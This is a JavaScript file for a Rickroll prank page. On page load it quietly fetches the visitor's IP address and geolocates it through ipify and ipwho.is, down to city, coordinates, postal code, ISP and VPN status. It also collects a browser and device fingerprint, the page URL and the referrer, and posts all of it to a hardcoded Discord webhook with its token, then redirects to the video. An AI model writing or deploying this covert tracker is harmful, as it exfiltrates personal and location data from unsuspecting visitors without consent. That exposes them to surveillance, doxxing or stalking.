function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const screen = `${window.screen.width}x${window.screen.height}`;
    const colorDepth = window.screen.colorDepth;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const languages = navigator.languages.join(', ');
    const cookiesEnabled = navigator.cookieEnabled;
    const doNotTrack = navigator.doNotTrack || 'Not specified';
    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    const deviceMemory = navigator.deviceMemory || 'unknown';
    const touchSupport = 'ontouchstart' in window ? 'Supported' : 'Not supported';
    const connection = navigator.connection ? {
        type: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt
    } : null;

    let deviceType = 'Desktop';
    if (/Mobi|Android/i.test(userAgent)) deviceType = 'Mobile';
    if (/Tablet|iPad/i.test(userAgent)) deviceType = 'Tablet';

    let os = navigator.platform;
    let browser = 'Unknown Browser';
    const browserList = {
        'Chrome': 'Google Chrome',
        'Firefox': 'Mozilla Firefox',
        'Safari': 'Safari',
        'Edge': 'Microsoft Edge',
        'Opera': 'Opera',
        'OPR': 'Opera',
        'MSIE': 'Internet Explorer',
        'Trident': 'Internet Explorer'
    };

    for (const [key, value] of Object.entries(browserList)) {
        if (userAgent.includes(key)) {
            browser = value;
            break;
        }
    }

    return {
        deviceType,
        os,
        browser,
        screen,
        colorDepth,
        timezone,
        languages,
        cookiesEnabled,
        doNotTrack,
        hardwareConcurrency,
        deviceMemory,
        touchSupport,
        connection
    };
}

function getLocationDetails(ipData) {
    const continent = ipData.continent || 'Unknown';
    const continentEmoji = {
        'Asia': '🌏',
        'Europe': '🌍',
        'Africa': '🌍',
        'North America': '🌎',
        'South America': '🌎',
        'Oceania': '🌏',
        'Antarctica': '🏔️'
    }[continent] || '🗺️';

    return `
🌐 **Continent**: ${continent} ${continentEmoji}
🏙️ **City**: ${ipData.city || 'Unknown'}
🏛️ **Region**: ${ipData.region || 'Unknown'} (${ipData.region_code || 'N/A'})
🇺🇳 **Country**: ${ipData.country} (${ipData.country_code || 'N/A'})
📍 **Coordinates**: [${ipData.latitude}, ${ipData.longitude}]
🗺️ **Map**: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
🏢 **Postal Code**: ${ipData.postal || 'Unknown'}
🕍 **Timezone**: ${ipData.timezone?.id || 'Unknown'} (UTC${ipData.timezone?.utc || 'N/A'})
📡 **ISP**: ${ipData.isp} (AS${ipData.asn || 'N/A'})
🏢 **Organization**: ${ipData.org || 'Unknown'}
💼 **ASN Info**: ${ipData.asn_name || 'Unknown'}
🌐 **Proxy/VPN**: ${ipData.proxy ? 'Yes' : 'No'} (${ipData.proxy_type || 'None'})
📶 **Mobile**: ${ipData.mobile ? 'Yes' : 'No'}
🏠 **Hosting**: ${ipData.hosting ? 'Yes' : 'No'}
    `;
}

function sendVisitorInfo() {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;
            fetch(`https://ipwho.is/${userIP}?fields=continent,country,country_code,region,region_code,city,postal,latitude,longitude,timezone,isp,org,asn,asn_name,proxy,proxy_type,mobile,hosting`)
                .then(response => response.json())
                .then(ipData => {
                    const deviceInfo = getDeviceInfo();
                    const locationDetails = getLocationDetails(ipData);
                    const connectionInfo = deviceInfo.connection ? `
📶 **Connection Type**: ${deviceInfo.connection.type}
⬇️ **Downlink**: ${deviceInfo.connection.downlink} Mbps
⏱️ **RTT**: ${deviceInfo.connection.rtt} ms
                    ` : '';

                    const message = `📡 **New Visitor Info** 📡\n\n` +
                        `🆔 **IP Address**: ${ipData.ip}\n` +
                        locationDetails +
                        `\n📱 **Device Type**: ${deviceInfo.deviceType}\n` +
                        `🖥 **OS**: ${deviceInfo.os}\n` +
                        `🌐 **Browser**: ${deviceInfo.browser}\n` +
                        `🖥 **Screen**: ${deviceInfo.screen} (${deviceInfo.colorDepth}bit)\n` +
                        `⏰ **Timezone**: ${deviceInfo.timezone}\n` +
                        `🗣 **Languages**: ${deviceInfo.languages}\n` +
                        `🍪 **Cookies**: ${deviceInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}\n` +
                        `🚫 **DNT**: ${deviceInfo.doNotTrack}\n` +
                        `💻 **CPU Cores**: ${deviceInfo.hardwareConcurrency}\n` +
                        `🧠 **Device Memory**: ${deviceInfo.deviceMemory}GB\n` +
                        `🖐 **Touch Support**: ${deviceInfo.touchSupport}\n` +
                        connectionInfo +
                        `\n🔗 **Page URL**: ${window.location.href}\n` +
                        `📌 **Referrer**: ${document.referrer || 'No referrer'}\n` +
                        `🕒 **Timestamp**: ${new Date().toISOString()}`;

                    fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: message })
                    });
                })
                .catch(error => {
                    fetch("YOUR_ERROR_WEBHOOK_URL", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: `Error fetching IP details: ${error}` })
                    });
                });
        })
        .catch(error => {
            fetch("YOUR_ERROR_WEBHOOK_URL", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `Error fetching IP: ${error}` })
            });
        });
}

window.onload = function() {
    document.getElementById('rickrollGif').src = "https://media.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif";
    sendVisitorInfo();
    setTimeout(() => {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }, 5000);
};
